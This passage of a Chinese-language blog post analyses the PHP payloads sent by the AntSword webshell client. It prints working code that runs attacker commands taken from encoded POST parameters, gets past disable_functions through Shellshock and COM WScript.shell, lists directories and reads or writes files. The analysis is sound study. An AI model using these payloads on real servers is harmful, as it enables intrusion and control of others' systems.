class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>首先关闭了报错信息，并将脚本执行之间设置为无限制，避免因为各种原因导致脚本运行超时而返回错误，而后开启缓冲区</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">	@set_time_limit(<span class="number">0</span>);</span><br><span class="line">	ob_start();</span><br></pre></td></tr></table></figure>
+
+<p><code>try</code> 语句内的是重头戏。</p>
+<ol>
+<li><p>解密参数，参数由一串随机字符串组成（上文中为<code>v1f656c7c99039</code> 、 <code>x44aab141531de</code> 、 <code>u6af8538cd4c2e</code>）</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;v1f656c7c99039&quot;</span>], <span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;x44aab141531de&quot;</span>], <span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;u6af8538cd4c2e&quot;</span>], <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p> 根据请求包，解密出这些参数</p>
+<ul>
+<li><p>  <code>$envstr</code>:  (空)</p>
+</li>
+<li><p>  <code>$p</code>: <code>/bin/sh</code></p>
+</li>
+<li><p><code>$s</code>: <code>cd &quot;/var/www/html&quot;;cd /var/www/html/;echo [S];pwd;echo [E]</code></p>
+<p>$p 为执行命令用到的解释器（在 Windows 中为 cmd， 在 Linux 中为 /bin/sh</p>
+<p>$s 为需要执行的命令</p>
+</li>
+</ul>
+</li>
+<li><p>判断操作系统（Windows / Linux），并以此加入环境变量。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">    <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">            @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这里判断操作系统使用的方法是判断路径的第一个字符是否为 <code>/</code> 。</p>
+<p> 此处的 <code>$envstr</code>  为空，所以进入不到 if 中，暂时不做分析</p>
+</li>
+<li><p>拼接解释器与命令，并执行命令</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">// $r = /bin/sh -c cd &quot;/var/www/html&quot;;cd /var/www/html/;echo [S];pwd;echo [E]</span></span><br><span class="line"><span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回显命令执行的结果</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>下面着重分析一下<code>runcmd</code> 函数</p>
+<p>在分析 <code>runcmd</code> 之前，先看一下 <code>fe</code> 函数</p>
+<h3 id="fe"><a href="#fe" class="headerlink" title="fe"></a>fe</h3><p>fe 函数可以理解为 <code>function_exists</code> 函数的扩展，用于判断是否可以使用某个函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function fe</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它先把 <code>disabled_functions</code> 转化成了数组，然后进行了三个判断：</p>
+<ol>
+<li> 函数是否存在 <code>function_exists</code></li>
+<li> 函数是否可调用 <code>is_callable</code></li>
+<li> 函数是否在禁用列表中 <code>in_array($f, $d)</code></li>
+</ol>
+<p>综合以上三点返回函数是否可用</p>
+<h3 id="runcmd"><a href="#runcmd" class="headerlink" title="runcmd"></a>runcmd</h3><p>runcmd 函数会以此判断各种执行系统命令函数，寻找能用的函数，也会尝试绕过禁用函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">        @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">        @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">        @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">        <span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">        <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">        @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">        @proc_close(<span class="variable">$p</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">        @antsystem(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">        <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">        <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">        <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">        <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依次判断了</p>
+<ul>
+<li>  system</li>
+<li>  passthru</li>
+<li>  shell_exec</li>
+<li>  exec</li>
+<li>  popen</li>
+<li>  proc_open</li>
+<li>  antsystem (猜测是蚁剑自己实现的函数)</li>
+</ul>
+<p>如果这些函数都被禁用，则会使用 <code>runshellshock</code> 函数或 <code>COM</code> 类</p>
+<p>可以说是面面俱到了</p>
+<h3 id="runshellshock"><a href="#runshellshock" class="headerlink" title="runshellshock"></a>runshellshock</h3><h4 id="什么是-shellshock"><a href="#什么是-shellshock" class="headerlink" title="什么是 shellshock"></a>什么是 shellshock</h4><p>参考文章： <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">https://zhuanlan.zhihu.com/p/35579956</a></p>
+<p>简单的理解就是一种利用 unix 漏洞 bypass disabled_functions 的方法</p>
+<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">            putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">        @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看出用到三个函数</p>
+<ul>
+<li>  putenv</li>
+<li>  error_log</li>
+<li>  mail</li>
+</ul>
+<p>其中 error_log 与 mail 函数只是起到执行 bash 的效果</p>
+<h3 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h3><p>详见：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/faq.com.php">https://www.php.net/manual/zh/faq.com.php</a></p>
+<p>而 WScript.shell 这个对象在 asp shell 中常用，不做扩展</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>此后的命令执行都是在上面的基础上做</p>
+<p>执行 ls 命令时，编码后的指令如下</p>
+<p><code>cd &quot;/var/www/html&quot;;ls;echo [S];pwd;echo [E]</code>，可以看到每一次都会切换目录（命令执行时的 cd，在下一次就会失效），而后执行命令。</p>
+<p>返回结果如下：</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623140254835.png" alt="image-20210623140254835"></p>
+<p>对此有不解——我理解的 [S] == Start， [E] == End 那命令执行的结果为什么不在这之中而在外面呢？或许需要分析源码才能明白（所以蚁剑的 loader 什么时候开源）</p>
+<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>蚁剑在访问目录时使用的核心代码为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$D</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o930dff714d3c9&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$F</span> = @opendir(<span class="variable">$D</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$F</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$M</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="variable">$L</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$N</span> = @readdir(<span class="variable">$F</span>)) &#123;</span><br><span class="line">            <span class="variable">$P</span> = <span class="variable">$D</span> . <span class="variable">$N</span>;</span><br><span class="line">            <span class="variable">$T</span> = @date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, @filemtime(<span class="variable">$P</span>));</span><br><span class="line">            @<span class="variable">$E</span> = substr(base_convert(@fileperms(<span class="variable">$P</span>), <span class="number">10</span>, <span class="number">8</span>), <span class="number">-4</span>);</span><br><span class="line">            <span class="variable">$R</span> = <span class="string">&quot;	&quot;</span> . <span class="variable">$T</span> . <span class="string">&quot;	&quot;</span> . @filesize(<span class="variable">$P</span>) . <span class="string">&quot;	&quot;</span> . <span class="variable">$E</span> . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (@is_dir(<span class="variable">$P</span>)) <span class="variable">$M</span> .= <span class="variable">$N</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$R</span>; <span class="keyword">else</span> <span class="variable">$L</span> .= <span class="variable">$N</span> . <span class="variable">$R</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$M</span> . <span class="variable">$L</span>;</span><br><span class="line">        @closedir(<span class="variable">$F</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>简单的遍历目录下的所有文件/文件夹，并回显</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623140641090.png" alt="image-20210623140641090"></p>
+<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="创建文件-写文件"><a href="#创建文件-写文件" class="headerlink" title="创建文件/写文件"></a>创建文件/写文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> @fwrite(fopen(base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o930dff714d3c9&quot;</span>], <span class="number">2</span>)), <span class="string">&quot;w&quot;</span>), base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o18205bef6e997&quot;</span>], <span class="number">2</span>))) ? <span class="string">&quot;1&quot;</span> : <span class="string">&quot;0&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>默认写入的数据为 <code>#Halo AntSword!</code></p>
+<h4 id="打开文件-读取文件"><a href="#打开文件-读取文件" class="headerlink" title="打开文件/读取文件"></a>打开文件/读取文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$F</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o930dff714d3c9&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$P</span> = @fopen(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(@fread(<span class="variable">$P</span>, filesize(<span class="variable">$F</span>) ? filesize(<span class="variable">$F</span>) : <span class="number">4096</span>));</span><br><span class="line">    @fclose(<span class="variable">$P</span>);;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>蚁剑会将 PHP 代码传入密码参数（上面为 cmd） 中，并且将需要用到的参数以随机字符串的变量名、base64 加密，并在前面加入两个字节的垃圾数据传入，由此来绕过一些 waf（在base64 这一层解码不出来）</p>
+<p>但是为什么 PHP 代码明文传输仍然存在一定的疑惑</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
+          
+            <a href="/tags/tools/" rel="tag"><i class="fa fa-tag"></i> tools</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Java_learn/Tomcat1" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
